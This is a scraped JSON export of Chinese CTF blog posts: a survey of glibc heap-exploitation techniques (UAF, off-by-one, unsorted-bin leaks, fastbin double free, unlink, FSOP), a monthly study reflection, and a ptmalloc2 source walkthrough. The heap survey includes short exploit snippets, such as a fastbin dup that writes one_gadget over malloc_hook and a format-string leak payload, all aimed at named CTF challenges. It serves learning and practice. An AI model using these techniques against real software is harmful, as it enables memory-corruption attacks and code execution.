libc。 改freehook为one_gadget​ leak libc后，我们可以利用相似的方法直接覆盖comment指针为free_hook 地址，然后二次edit comment改其内容为one_gadget。 ​ exp暂时不发。","categories":[{"name":"HEAP - ChunkOverlapping","slug":"HEAP-ChunkOverlapping","permalink":"https://fuurinko.github.io/categories/HEAP-ChunkOverlapping/"}],"tags":[{"name":"starctf","slug":"starctf","permalink":"https://fuurinko.github.io/tags/starctf/"}]},{"title":"heap知识点总结","slug":"sum_heap知识点总结-2022-3～4","date":"2022-04-14T16:00:00.000Z","updated":"2022-04-15T07:15:30.337Z","comments":true,"path":"2022/04/15/sum_heap知识点总结-2022-3～4/","link":"","permalink":"https://fuurinko.github.io/2022/04/15/sum_heap%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-2022-3%EF%BD%9E4/","excerpt":"","text":"​ 对于这些天题目的一些小归纳。目前的涵盖范围是高级house技术以及高版本glibc应用以外的所有题型。 逆向大致​ 一般来说大多数菜单题都会申请的比如说note定义结构体，当然也有那种纯纯利用malloc出的ptr进行读写操作的，但是比较少。 结构体逆向​ 首先需要利用眼力，想 象 力和动调逆出这个结构体里的字段，以及其占用的size，在内存空间的布局。如果足够闲也可以在ida中新建结构体，然后将题目中的结构体与你创建的结构体关联起来，这样伪代码的可读性又会增加很多。 ​ 很多题都会在结构体中保存note content的指针，这个指针也是我们解题的关键所在。其他乱七八糟的东西就看出题人是不是爱整活了。 ​ 但是关注于堆块管理其实很关键，因为不同的管理系统对应着不同的指针覆盖可能性以及不同的free，show，edit模式。 一般目前我做到过的堆题关于指针管理的操作大概有这几类： 不申请任何结构体，不对指针做任何管理，直接使用malloc分配的heap段指针进行增删查，例如xctf-oneman_army，逻辑比较简单，但是利用可能会比较综合。 不申请任何结构体，但是会把malloc分配的heap段指针保存于bss段。 对于每个单位chunk，申请具体size的heap段结构体，一般来说地址是与对应chunk相邻，通常保存了对应chunk的size以及data ptr。 对于每个单位chunk，申请具体size的heap段结构体，并且结构体比较复杂，通常含有几个指针，有时甚至会自己实现一个链表管理系统。 功能逆向​ UAF​ 对于每种结构体，不同的指针管理也造就了不同质量的uaf（如果有）。举两个简单的例子。 第一种结构体​ 比如说第一种，（这种太少了，例子都不好找），例子就是pwn.college的babyheap module的前几个level。 ​ 意会一下,正如前文说到的，没有任何结构体，只是用一个数组将不同idx的ptr组织在了一起，所以free也就是free对应malloc出的ptr。 ​ ​ ​ 在gdb中看就是将chunk data ptr对应的8字节清空，然后将ptr+1置为fd。如图（这个是tcache，不过问题不大） ​ 所以我们很容易地就能够二次利用这个free chunk。 第二｜三种结构体​ 对于第二种结构体，uaf的质量和第一种类似，因为本身还是咩有结构体，所以只会影响后续利用，并不会影响uaf的强度。 ​ 对于第三种结构体，一个经典的例子就是hitcon training的hack note。 ​ 先看结构体的gdb。 ​ ​ 32位程序，指令用错了，别骂了（ ​ 还有f5，这里截取了一些关键操作。 12345*(&amp;notelist + i) = malloc(8u);//在bss段保存的指针上malloc一个8size的结构体chunk**(&amp;notelist + i) = print_note_content;//调用了puts函数的一个函数地址，题目的解题点就在于覆盖这个为后门。v0 = *(&amp;notelist + i);*(v0 + 4) = malloc(size);//申请size大小的chunk，将返回的ptr储存于ptr+4read(0, *(*(&amp;notelist + i) + 1), size);//读取size大小的data ​ 这里关键看free函数。 123456if ( *(&amp;notelist + idx) ) &#123; free(*(*(&amp;notelist + idx) + 1)); free(*(&amp;notelist + idx)); puts(&quot;Success&quot;); &#125; ​ 这里uaf小白兔都能看出来，我们关注的重点是free的ptr。free的第一个指针指向chunk data，第二个指向结构体指针，就是那个0x8的chunk。 ​ 随便申请一个0x20的chunk，是这样。 ​ ​ free它。可以看到，确实验证了我们的说法，分别清空了chunk data指针和结构体指针。而我们之前写在chunk上的数据并不会被清空，实际上，一般来说这个数据都不会被清空。 ​ 到这里想一想，我们刚才申请的每一个note中，分别是一个data的content和一个结构体的ptr，并且free也是将这两个指针free，也并没有置0，所以我们还能够利用的就是结构体中printnote的指针。 ​ 第四种结构体和前面几种的道理是相同的，看清楚free的是哪一个指针，会不会清空chunk的data，会不会残留可以劫持的指针，置零了哪些？又没有置零哪些？这都是我们需要考虑的问题。 ​ off by one​ 这里主要归纳一下这个漏洞点在不同题目中的不同体现。 直观的字节溢出​ 体现在能输入的data size比malloc出的chunk size大一。这种漏洞一般需要非常刻意的构造，比如说这样的add： 12ptr = malloc(size);v1 = read(0,*ptr,size+1); ​ 又比如说这样的字符串操作： 1234if(strlen(buffer)==24) &#123; strcpy(chunk1,buffer);//会向buffer中写入一个空字节。 &#125; 并不是很直观的字节溢出​ Asis CTF 2016 b00ks： 123456789101112buf = ptr;//ptr是malloc返回的chunk data ptrfor ( i = 0; ; ++i )&#123; if ( read(0, buf, 1uLL) != 1 ) return 1LL; if ( *buf == &#x27;\\n&#x27; ) break; ++buf;//buf在结束后都会多+1 if ( i == number ) break;&#125;*buf = 0;//多出来的一个字节会置零，相当于一个空字节溢出 ​ ​ 以上每种类型不一定逆向简单利用就简单，但是逆向难的题通常利用起来也很头晕（ 利用保护？​ 拿到题首先查保护，比较关键的就是pie和relro保护。 ​ 不过pie对于堆题的杀伤力似乎是没有栈题大的，栈一开pie如果没有leak的话直接亲妈不认没法rop了。 ​ relro决定了这道题是修改got表呢，还是改hook，其实两者都需要任意地址写和leak（有时改hook不需要leak，比如xctf-NoLeak这道题），真正比起来，一般来说利用难度差得并不是特别大。 ​ 有时候有些题也会选择一些非常奇怪的保护，比如xctf上的noleak，没有nx，所以其实需要我们在可控地址写shellcode。但是这都是比较简单的情况。 ​ 利用思路？​ 逆向完之后肯定就是找漏洞点了。以libc版本来分类，这里主要讨论2.23和2.27两大版本的题。 一般来说普通堆题的两大关键步骤就是leak和任意地址写。leak主要又是unsorted bin leak，目前做的几道题，十道有八道都是靠各种古怪的方式进行unsorted bin leak，剩下两道估计又是覆盖空字节造成输出不截断。而任意地址写，就是靠各种漏洞劫持某个指针使其指向malloc_hook或者什么got表的地址，然后修改内容。 ​ 非常遗憾地，leak和构造任意地址写的顺序并不是分割的，我们很难提供一个系统化的思路来归纳先leak再劫持指针balabala，很多情况下，是一个操作的思路同时达到了leak和劫持指针的效果。 ​ 先后顺序这种东西虽然做题没有，但是归纳可以有。 leak​ 先看leak吧。正因为确实十有八九都是依靠unsorted bin leak，所以大致总结一下我碰到过的所有实现了unsorted bin leak的方式，当然非unsorted bin的也有（ ​ 复习一下unsorted bin的原理。直接从wiki上面偷图了。 ​ ​ 所以最后插入链表的bin的fd其实是指向main_arena内部的。 ​ gdb中：（也是偷图） ​ 这样就比较清楚了。然后说说我遇到的题目中的leak吧。 奇怪的leak方式​ 先说和unsorted bin leak关系不大的leak方式。656666666666 1:利用mmap() leak libc。相关题目是gyctf_2020_force。 ​ 这个题的前置条件是，没有任何输出函数，got也没有办法篡改，漏洞是白给了heap addr，还可以任意分配size，并且有堆溢出可以修改next chunk size。所以利用上很明显是house of force，但是我们需要考虑如何leak。 ​ 程序给出了目前申请的每个chunk的heap段上的地址，所以突破口就在这里，我们可以利用mmap()拓展一个巨大的chunk，这个chunk被分配在libc.so加载段的低地址，只与它有一个较小的偏移，且我们又可以直接拿到这个chunk的地址，因此我们就四舍五入leak 了libc。 ​ 这张图中，我们add的chunk addr为0x7fe8af273000，就在libc - 0x76F000的地方。 ​ 这个方式利用的前提是我们能够leak heap base，并且能add chunk的size大于mmap()申请的范围，而且还要有直观的show（）。 2:格式化字符串leak​ hctf2016_fheap： ​ （这道题当时咩有做完，因为其实就没有怎么做过格式化字符串，所以并不是很会） ​ 这道题的特殊点，在于free功能是调用保存在堆中的函数指针，并且有质量很好的uaf，所以理论上我们能够将这个指针覆盖为任意函数地址。 ​ 因为没有比较好利用的leak，所以我们可以将free函数的指针覆盖为printf的plt，并编辑chunk内容为恶意格式化字符串，从而leak。 ​ 贴一点exp： 12add(25,b&#x27;Start%176$pEnd&#x27;.ljust(24,b&#x27;a&#x27;) + b&#x27;\\xb6&#x27;)#chukn2 ,point to chunk0free(1) ​ ​ 这道题给我的启发是，类似格式化字符串这种比较不常见的漏洞，有时候并不能等着程序给我们，而是可以主动构造。 ​ 这个方式要求程序的重要功能会调用函数指针来执行。并且got表可改，而且没有pie。 改got表为输出函数​ 这个点其实用得也比较多。 ​ 2014 hack.lu oreo ：程序中存在的漏洞，一个是可以溢出覆盖下一个chunk的fd，并且打印时可以将fd指向的区域打印，所以只要覆盖chunkfd为某个函数的got表地址，就能够通过打印它leak出这个函数的真实地址（似乎有栈题那味了） ​ 这个方式要求程序中需要拥有直接打印指向内容的指针的功能，没有pie，还是比较苛刻。 unsorted bin leak​ 下面是我遇到的几种方式，其实不管哪种方式，核心目的都是让chunk进入unsorted bin，并且找到合适的方法把这个chunk的data打印。 实现unsorted bin的两个关键 如何将chunk放入unsorted bin 如何将bin fd show出？ ​ 在构造leak的时候，往往需要一步到位，甚至还要考虑如何同时leak和构造任意地址写，这也是pwn的乐趣（难点）所在捏。 直接free small/large chunk并show​ 这个方法是对上面两个问题最直白的回应：如何放入？free small/large chunk。如何show？uaf直接show。至于如何进行free或者show，就是对于程序理解的问题了。 ​ 9447_CTF-Search Engine： 利用程序的trick直接free一个small chunk，让其进入unsorted bin并利用程序的trick show出它。这里放一段leak的exp。这里的难点就是，searh word的操作给free和show甚至漏洞点本身加上了一层壳，如何看透壶中日月呢？就需要逆清楚程序捏。 123456789sentence = b&#x27;a&#x27;*0x80 + b&#x27;bbbb bbbb bbbb b&#x27;#首先申请非fastbin chunk，如果是tcache的话建议申请large chunk。index_sentence(len(sentence),sentence)#add上面的那个chunksearch_word(1,&quot;b&quot;) #search的功能就是一个free操作的前置条件，只有在句子中找到了对应的单词才能free，这里我们在刚刚add的‘bbbb bbbb bbbb b’中寻找‘b’，所以返回了我们申请的句子chunk的ptr。delete()#free 这个句子，句子chunk（0x80的small chunk）进入unsortedbin。search_word(1,&#x27;\\x00&#x27;)#利用题目的trick，也就是一个uaf，虽然我们刚free了句子chunk，但是指针并没有置0，所以搜索功能还是合法的。因此搜索空字节，就能找到我们刚刚free的unsorted bin。p.recvuntil(&#x27;Found&#x27; + str(len(sentence)) + &#x27;: &#x27;)#利用show功能打印出来。unsorted_bin_addr = u64(p.recv(8))p.recvuntil(&quot;Delete this sentence (y/n)?&quot;)p.sendline(&#x27;n&#x27;) ​ 这个方法主要适用于对于链表管理没有那么花里胡哨，free就是free，show就是show的那种题，并且要有比较好用的uaf。然后肯定还得能申请到unsorted bin。 劫持bin fd，伪造unsorted bin chunk，越界free。​ ciscn_2019_daliy: ​ 这个方法感觉比较神奇，大概就是劫持某个fastbin chunk的fd，把它填为一个先前申请过的small chunk的地址，然后再越界free掉（漏洞点）。ps：这里没有uaf。 ​ 为什么不直接申请small chunk然后直接free呢？因为这样就没有办法打印了（没有uaf）。我们在leak unsorted bin的时候一定要考虑，我们放入unsorted bin中的这个chunk是否能够被打印出来。一般没有uaf的题目就需要一些奇特的方法构造，有的话一般来说也比较直接。 ​ 所以这个方式其实并没有什么普适性，但是提供给我们了一种比较笼统的思路，就是当程序不具有uaf的时候，可以试图通过操作别的chunk来show出unsorted bin。这种操作通常需要我们刻意构造。 house of orange方式leak​ 例题就是house of orange。 ​ 具体的获得unsorted bin的方式请移步house of orange原理，我们重点关注怎么将它leak出来。这道题是没有free的，而将top chunk放入usorted bin后，top chunk原来的地址就会变成unsorted bin链表中的唯一一个bin。而如果我们再次add一个large chunk，那么这个chunk就会分割unsorted bin所在的chunk，也就是曾经的top chunk上的地址，而因为没有任何free等清空的操作，我们分配的large chunk并不会覆盖原有的unsorted bin 的fd，而且正好这个chunk又是可以被直接打印的allocated chunk，因此leak就变得很容易了。 ​ 申请large chunk前： ​ 申请large chunk后： ​ 这个题的普适性也不高，首先一般的题肯定都有free，所以获得unsorted bin并没有那么麻烦，但是也给我们一些启发，就是如果我们能够申请到unsorted bin所在的chunk的地址的话，就可以比较方便地leak。 破坏tcache管理块​ 例题来自ciscn_2021_lonelywolf。 ​ 这个题的漏洞点事uaf，看似比较常规但是有一个很奇妙的利用思路，就是先用tcache dup leak出heap addr（这个有uaf所以很简单），然后改bin的fd，allocate到tcache的管理chunk，覆盖垃圾数据将其破坏，这样tcache就失效了。 ​ 失效了有什么效果呢？当然不只是简单的无法再申请到tcache chunk了。我们在覆盖垃圾数据以后将这个chunk free掉，垃圾数据将破坏tcache，导致之后free的chunk都不再进入tcache，这里“之后free的chunk”当然也包括我们刚刚free的管理chunk本身，而且由于这个chunk本身是一个large chunk，因此会进入unsorted bin中，我们也能通过show来leak。 ​ 这里的普适性其实还可以，毕竟条件只有uaf和比较方便的tcache dup，但是其实如果是一般的题的话，直接将tcache填满也能达到同样的效果，这里之所以要特地破坏tcache结构是因为这个题只能操作一个chunk，无法填满tcache。 覆盖chunk size为large chunk​ 攻防世界-oneman_army ​ 这里也是伪造unsorted bin，但是思路和ciscn_2019_daliy不太一样。同样的，这个题的机制也是只能控制最后add的chunk。 ​ 在利用之前，申请从0x10 -0x90size的chunk，每个递增0x10的size，分别申请九个，作为铺垫。 ​ 首先申请chunk，edit堆溢出修改下一个free chunk为large chunk，然后申请被覆盖的free chunk的位置，此时堆上的状况大致是这样。 ​ 接着把这个chunk free掉，也就是free一个size为0x4b1的laege chunk。这样我们就获得了unsorted bin chunk，接着我们还需要把它show出来，这也是这里的关键。 ​ 因为我们刚才将这个chunk free了，由于这个题没有uaf，我们不能直接show，而是需要构造合适的指针使一个unsorted bin chunk正好对应申请出来的chunk。 ​ 第一次我们申请0x20的chunk。由于某种特殊的机制（我不知道具体原因），会使unsortedbin 分割0x30的空间给这个chunk，以至于自己的指针向后偏移了三十，变成了0x30 free chunk的位置，然后再申请0x30的chunk，这里会申请到之前free 过的空间，正好也就是0x30 free chunk的位置，这样unsorted bin也不会偏移。这样我们unsorted bin指向的chunk就是一个可以show出来的chunk了。 ​ 这道题的思路比较绕，而非常值得借鉴的方法就是在开头申请九个以0x10递增的chunk，给予了后续的利用很大的便利。当然我们也可以随用随add，但是如果在开头就申请好，还能作为思考时对于chunk位置的参照，非常牛逼。 ​ 对于利用本身，其实思路并不是非常新颖，还是核心就是获得unsorted bin，不管是改fd也好，改size也好，然后想尽办法将合法的chunk申请到它的地址上，并show出来。 noleak的unsorted bin leak​ 例题：xctf-noleak ​ 一个小trick。题目本身无法构造leak，但是由于是unlink。所以可以直接让chunk指向unsorted bin的尾链表，然后编辑这个fd的最低位为&#39;\\x10&#39;。这样其实就被改成了malloc_hook，后续的利用就不多说了。 任意地址写​ 在leak以后，我们一般都会劫持某个指针为leak出来的函数地址，一般比较系统的流程有如下几种： 劫持got表地址，修改got表为system(),one_gadget。 劫持程序提供的某个指针（这个指针应当在流程中被调用），修改为system(),one_gadget。 劫持hook，修改内容为system(),one_gadget。 ​ 但一般来说实现getshell目的的指针劫持的前提，是获得一个任意地址写，这样的构造方式多种多样，所以下面就是我碰到的题目对于这个点构造思路的归纳，目前也只碰到过这几种情况，如果做到新的题型，也会持续更新。 fastbin + uaf单纯的uaf利用​ 看到uaf，首先看uaf的质量如何。这就和之前逆向中归类的几种结构体有关了，并且逆向module中也给出了一些对应的分析，所以就不再放具体的例题了。 ​ 不过无论怎样，比较高质量的uaf对应的核心就是可以操作已经free的chunk，进行编辑或者打印，甚至double free，不过无论是有没有uaf，解题的关键都是了解程序bug背后的原理。 fastbin double free​ 例题：ciscn_2019_double ​ 这道题比较魔幻，程序自身实现了一种类似单链表的结构来管理申请到的chunk，因此ida逆向会变得十分抽象，但是用gdb动调来概括无非是“如果申请和某chunk相同内容的chunk，就只会allocate一个结构体chunk，并在结构体内储存指向那个chunk data的指针。”。 ​ 而这里，因为是两个chunk同时指向同一个chunk data，所以可以通过一个chunk来操作另外一个chunk，比如chunk0和chunk1内容相同，所以free0，show1，就能打印heap addr，实现heap base leak。（因为这里会对idx作合法性检测所以虽然有uaf但是还是不能操作已free的chunk） ​ 在前面一系列利用之后我们成功leak了libc，所以需要将fastbin fd改为malloc hook地址并成功地fastbin dup到对应地址，那么这里如何劫持fastbin fd呢？这里就是这道题的精髓所在，这道题有uaf，但是我们不能直接操作chunk来实现uaf，而是需要利用指向它data的另外一个chunk来实现。 ​ 那么为什么这个题不能利用直接的uaf而是要构造double free呢？还是因为程序不能操作已free的chunk，所以在free之后就没有办法编辑任何chunk的fd了，但是在free前编辑又没有意义。 ​ 所以这里只能构造double free，让多个chunk的指针指向这个chunk。 ​ 贴一小段exp： 1234567891011121314free(0)#fastbin(0x67) =&gt;chunk2free(2)#fastbin(0x67) =&gt;chunk4=&gt;chunk2free(1)#fastbin(0x67) =&gt;chunk2=&gt;chunk4=&gt;chunk2add(b&#x27;1&#x27;*0x67)#6 -&gt;chunk2edit(6,p64(malloc_hook-35)) #modify chunk2 fd to malloc_hook add(b&#x27;1&#x27;*0x67)#7 ,-&gt; ??add(b&#x27;3&#x27;*0x67)#8 ,-&gt;chunk4add(b&#x27;\\x00&#x27;*67)#9 -&gt;chunk2,allcate to mallo_hook - 35edit(9,b&#x27;4&#x27;*19+p64(one_gadget))#9 ​ ​ 这里将chunk2的fd修改为malloc之后fastbin中就有这个chunk了。这是也就是uaf的效果，指针被free后还能利用，导致虽然我们已经在这个chunk的地址上申请了新的chunk，但是之前的指针还是留存着，以至于其fd的状态还是会被记录。 ​ 这个题的话其实就是普通的fastbin double free的利用，很多时候题目都会给自己包装一下让自己显得不那么简单，但是如果弄清楚的话，它真的就是一个很简单的fastbin double free。 ​ 而fastbin double free的重要效果就是使得多个指针指向同一个chunk，以至于我们可以同时利用多个chunk来控制一个chunk的内容，并且由于uaf，我们再次分配到这个chunk上时，之前这个chunk的free链表中的状态还是会被记录，因此我们可以再次add到chunk上来修改chunk作为free chunk时的fd指针，以实现fastbin dup。 Tcache dup​ 不管是2.27还是2.29，只要漏洞点足够强，那么这个技巧就能够简单地被实现。原理和fastbin dup几乎一样，就不多赘述了。 unlink​ 布置fastbin的bk和fd，分别覆盖为 target - 0x18，target - 0x10，触发unlink后就能使为target 指向target - 0x18 。32位需改机器字长。 offbyonechunk overlapping​ 一般是通过chunk overlapping先构造出uaf，再unlink劫持指针。 堆溢出unsorted bin attack​ 前置知识是unsorted bin attack。当unsorted bin被取出时，会执行以下操作： 12unsorted_chunks (av)-&gt;bk = bck; = unsorted_chunks (av); ​ 如果将其bk劫持，这样bck-&gt;fd就可以被修改为unsorted_chunks (av)，也就是任意地址+0x10 =unsorted_chunks (av)。 IO_FILE​ 因为利用条件比较复杂，所以目前也只做过经典例题。 劫持vtable​ 根据libc版本不同，利用方式也不同，2.23及以后的版本只能伪造vtable，之前的话可以直接修改。 fsop​ 劫持io_list_all指针，使其指向fake chunk，在chunk中构造vtable。 ​ ​","categories":[{"name":"Generalization","slug":"Generalization","permalink":"https://fuurinko.github.io/categories/Generalization/"}],"tags":[{"name":"sum","slug":"sum","permalink":"https://fuurinko.github.io/tags/sum/"}]},{"title":"三月","slug":"vivi_2022年三月","date":"2022-04-13T03:35:35.186Z","updated":"2022-10-24T12:35:54.951Z","comments":true,"path":"2022/04/13/vivi_2022年三月/","link":"","permalink":"https://fuurinko.github.io/2022/04/13/vivi_2022%E5%B9%B4%E4%B8%89%E6%9C%88/","excerpt":"","text":"愛で世界が変わるもんか。 上个月做了什么：​ 刷了很多题，从简单的栈题到简单的fastbin，然后四月上旬刷了很多2.27的tcache或者unsorted bin，unlink之类的稍微有一点点难度的堆题，但基本都是闷头刷，遇到不理解的地方也都是零散地学一些知识，没有总结归纳，没有系统的问题解决。 感想：​ 写了很多blog，但是质量并不是特别高。做题方面，逆向的速度明显增加了，思考题目也更加地逻辑化，但是堆上很多分配流程以及chunk还有链表的一些概念还是比较模糊（尤其是size比较大的那种），这个打算通过看源码解决。 ​ 专业课，个人觉得重要的课都在认真上，并且都会在课前安排一个小时左右来复习，以提升上课效率，尽量让这占用我将近半天的东西的价值更高一些。但是平时也由于各种各样的原因，有大量的（长达一两个小时）时间的浪费，比如说和人聊天（毫无意义的非拓宽社交面的聊天），比如说午睡起不来，这种时间完全可以被抹去。 这个月打算：​ 先把之前做过的题总结整理一下，然后开始看ptmalloc的源码，找出一些疑惑并且解决它们。这周之前完成吧。（因为这周有运动会，相当于连放三天假） ​ 有时间还是要改一下blog的css，标题的行距和字体太呆了，然后整个目录。 ​ 然后把之前一些没有做下去的题getshell一下，提高每道题的完成质量。 ​ 接着继续刷攻防世界的题目以及2020和2021年国赛pwn的复现，这个阶段刷题的质量力求在精不在多。休闲的时候可以接触一些基于堆题的fz，以及刷一些栈题活跃一下气氛，保持一天一道堆题，半道栈题就行。 ​ 五月，如果有时间就做点kernel。 ​ ​","categories":[{"name":"AUDITION","slug":"AUDITION","permalink":"https://fuurinko.github.io/categories/AUDITION/"}],"tags":[{"name":"vivi","slug":"vivi","permalink":"https://fuurinko.github.io/tags/vivi/"}]},{"title":"ptmalloc2源码分析","slug":"heap_learning_glibc源码分析","date":"2022-04-13T03:21:41.918Z","updated":"2022-04-24T06:55:18.305Z","comments":true,"path":"2022/04/13/heap_learning_glibc源码分析/","link":"","permalink":"https://fuurinko.github.io/2022/04/13/heap_learning_glibc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/","excerpt":"","text":"prelude​ 感觉源码分析是很多佬都做过的一件事情，但是对于我来说源码分析确实是件比较困难的事，但正因为困难，才有必要攻克，之后的高版本或者诡异版本glibc题少不了源码分析，也当是一个修炼吧。文章分析的大致顺序是按照int_malloc以及int_free的函数顺序介绍的，其中会穿插一些被调用的函数的介绍。 csapp malloc lab review​ 在着手看源码之前先复习一下csapp lab。 ​ 去年十二月的时候非常之草率地写完了malloc lab，到现在四月份，一些操作已经忘记得只会报菜名了，但是问题不大。 ​ malloclab的大体设计以几个分配器的不同设计思路作为level的划分 level1: 隐式空闲链表，first fit，next fit，bset fit。 level2: 显式空闲链表，separated fit。 ​ （当然这种level的分级是由我自己武断决定的） ​ level1中的三种适配方案其实在代码上的体现差别并不是非常的大，并且其实lab的要求只是补全那么一两个函数，感觉并不是十分复杂。所以这里主要关注于level2，显式空闲链表+分离适配的方案。这种方案也是lab中最接近ptmalloc的。 ​ 显式空闲链表主要是在chunk内增加了双向循环链表的前驱以及后继指针，用于连接不同的bin，而分离适配并没有对不同的chunk定义不同的取出以及插入方式，只是比较简单地将chunk以2^n划分为八个不同的区域。 struct/definestruct malloc_chunk123456789101112struct malloc_chunk &#123; INTERNAL_SIZE_T mchunk_prev_size; /* Size of previous chunk (if free). */ INTERNAL_SIZE_T mchunk_size; /* Size in bytes, including overhead. */ struct malloc_chunk* fd; /* double links -- used only if free. */ struct malloc_chunk* bk; /* Only used for large blocks: pointer to next larger size. */ struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */ struct malloc_chunk* bk_nextsize;&#125;; ​ 注解比较详细。但是也注解申明了，这并不是真实的chunk的定义，但是却给出了chunk在内存中的一个大致的模型。下面也有很长一段注解来解释chunk，挑一些讲讲。 1：chunk中的A|M|P位，“A”位指该chunk是不是main_arena下的chunk，如果该chunk为其他线程下的chunk，则该位置1，“P”位就是“inuse”位，“0”为free，“1”为allocated， ‘M’位是表示该chunk是否为mmap()函数分配，这一位是最高优先级的，因为首先这是一个allocated chunk，其次它既不是在一个arena中，也不会于free chunk相邻。 bin按照源码中的顺序。 unsorted bintop chunk​ M_TRIM_THRESHOLD bin_map​ 记录bin是否是空的。 fastbinLIFO。 fastbin的所有bin的prev_inuse位都是1。它们只会在*malloc_consolidate（）中被合并。 1#define MAX_FAST_SIZE (80 * SIZE_SZ / 4) functionmalloc_int_malloc​ 首先定义一些变量，具体含义在用到之后再分析。 12345678910111213141516171819202122INTERNAL_SIZE_T nb; /* normalized request size */ unsigned int idx; /* associated bin index */ mbinptr bin; /* associated bin */ mchunkptr victim; /* inspected/selected chunk */ INTERNAL_SIZE_T size; /* its size */ int victim_index; /* its bin index */ mchunkptr remainder; /* remainder from a split */ unsigned long remainder_size; /* its size */ unsigned int block; /* bit map traverser */ unsigned int bit; /* bit map traverser */ unsigned int map; /* current word of binmap */ mchunkptr fwd; /* misc temp for linking */ mchunkptr bck; /* misc temp for linking */#if USE_TCACHE size_t tcache_unsorted_count; /* count of unsorted chunks processed */#endif 接着计算需要分配的chunk size。也就是根据用户申请的size，计算出实际需要分配的内存。 12345678910/* Convert request size to internal form by adding SIZE_SZ bytes overhead plus possibly more to obtain necessary alignment and/or to obtain a size of at least MINSIZE, the smallest allocatable size. Also, checked_request2size traps (returning 0) request sizes that are so large that they wrap around zero when padded and aligned. */checked_request2size (bytes, nb);//计算chunk大小，例如添加对齐，size域需要的size等。 ​ 接着验证该chunk是否属于某个分配区，如果没有的话，也就是av == NULL，则调用sysmalloc() 进行分配。关于sysmalloc() 的分配大概会在另外一篇笔记中介绍。 1234567if (__glibc_unlikely (av == NULL)) &#123; void *p = sysmalloc (nb, av); if (p != NULL) alloc_perturb (p, bytes); return p; &#125; ​ 在得到了chunk需要分配的具体size后，就可以根据不同的size分配不同的chunk了。 123456if ((unsigned long) (nb) &lt;= (unsigned long) (get_max_fast ()))//get_max_fast返回fastbin chunk可以储存的最大size &#123; idx = fastbin_index (nb);//首先获取fastbin 的idx， ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)，假设为64bit，那么这里的idx就是nb/4 -2 mfastbinptr *fb = &amp;fastbin (av, idx);//根据fastbin的idx从fastbin表中取出空闲chunk的链表指针。av-&gt;fastbin[idx] mchunkptr pp; victim = *fb; ​ 这中间有一段REMOVE_FB(*fb*, *victim*, *pp*)的宏定义代码，我们先不管他。 12345678910111213if (victim != NULL)//如果成功获取fastbin的指针&#123; if (SINGLE_THREAD_P) *fb = victim-&gt;fd;//将链表头设置为该空闲chunk的下一个chunk(victim-&gt;fd else REMOVE_FB (fb, pp, victim); if (__glibc_likely (victim != NULL)) &#123; size_t victim_idx = fastbin_index (chunksize (victim));//获取victim的idx if (__builtin_expect (victim_idx != idx, 0)) malloc_printerr (&quot;malloc(): memory corruption (fast)&quot;); check_remalloced_chunk (av, victim, nb); ​ 这里插一句，__builtin_expect以及前面遇到过很多次的__glibc_unlikely 等函数，都是为了让程序告诉编译器程序最有可能执行的分支而设置的，以使得编译器对代码进行优化，减少指令跳转带来的性能下降。而将__builtin_expect封装成宏指令，就变成了likely和unlikely宏。 12#define likely(x) __builtin_expect(!!(x), 1) //x很可能为真 #define unlikely(x) __builtin_expect(!!(x), 0) //x很可能为假 ​ 接着是启用tcache的内容。操作与fastbin几乎一致，就不详细分析了。 123void *p = chunk2mem (victim);//返回一个指向user data的指针alloc_perturb (p, bytes);//初始化user datareturn p; ​ 所以总结一下，在所有条件都进入理想分支的情况下，一个fastbin chunk是这样分配的： 123获取用户输入的size，调用 checked_request2size （）转换为实际分配的size ===&gt; 将size与fastbin最大size比较，在范围内，于是调用 fastbin_index (nb)，获取这个chunk在fastbin中的idx ===&gt; 根据获取的fastbin的idx，从fastbin中取出指向空闲链表的指针 ​ 如果fastbin 中没有合适size的chunk，或者没有空闲chunk等各种原因导致程序并没有获取到fastbin idx，就进入small bin的范围搜索。 123456789101112131415161718192021222324252627282930if (in_smallbin_range (nb))//size在small bin范围内 &#123; idx = smallbin_index (nb);//获取small bin的idx bin = bin_at (av, idx);//根据idx获取small bin链表中的空闲chunk指针。 if ((victim = last (bin)) != bin)//如果chunk_ptr -&gt;bk != chunk_ptr，两种情况，victim不为0或有多个bin &#123; if (victim == 0)//victim为0说明small bin没有初始化 malloc_consolidate (av);//合并 fastbin else &#123; bck = victim-&gt;bk;//第二种情况，此时中smallbin链表不止一个binif (__glibc_unlikely (bck-&gt;fd != victim))//double free &#123; errstr = &quot;malloc(): smallbin double linked list corrupted&quot;; goto errout; &#125; set_inuse_bit_at_offset (victim, nb);//将victim+size，也就是chunk尾部所指向的地方或上prev_inuse字段，标识着该 chunk为used状态。 bin-&gt;bk = bck;//将bin插入链表中 bck-&gt;fd = bin; if (av != &amp;main_arena)//不在主分配区的情况 victim-&gt;size |= NON_MAIN_ARENA;//置A位为1. check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim);//指向用户data alloc_perturb (p, bytes);//初始化p指向的内存 return p; &#125; &#125; &#125; ​ ​ 稍微分析一下这里的double free情况，此时bck-&gt;fd != victim，说明在victim和bck间被插入了新的节点，也就是double free造成的。 ​ smallbin未初始化分支的 malloc_consolidate (av);操作稍后会单独分析，这里按照理想状况继续走。 ​ 接着，如果size不是在small bin及以下范围的话，就直接分配large bin链表中的chunk。在获取large bin的idx后也对fastbin进行了合并。 123456else &#123; idx = largebin_index (nb);//首先获取large bin idx if (have_fastchunks (av))//如果fastbin不为空 malloc_consolidate (av);//合并fastbin &#125; 12345678910/* If this is a large request, consolidate fastbins before continuing. While it might look excessive to kill all fastbins before even seeing if there is space available, this avoids fragmentation problems normally associated with fastbins. Also, in practice, programs tend to have runs of either small or large requests, but less often mixtures, so consolidation is not invoked all that often in most programs. And the programs that it is called frequently in otherwise tend to fragment. */ ​ 对于合并的解释，官方注释是这样说的：虽然看起来没有检查是否有适用的空间就讲fastbin全部清理看起来有些草率，但是这有效避免了fastbin造成的内存碎片化问题。并且在实际运用中，程序并不会经常多次混合着申请small bin或者large bin，所以合并的情况并不会经常发生，而正是那些频繁调用它们的程序导致了内存碎片化（所以适当的合并有助于减少这个问题）。 ​ 然后进入unsorted bin ​ 首先是一个大while循环，在每一次循环中遍历unsorted bin链表并将所需要的指针及字段保存。 1234567891011while ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))//遍历unsorted bin链表 &#123; bck = victim-&gt;bk;//保存前一个chunk的指针 if 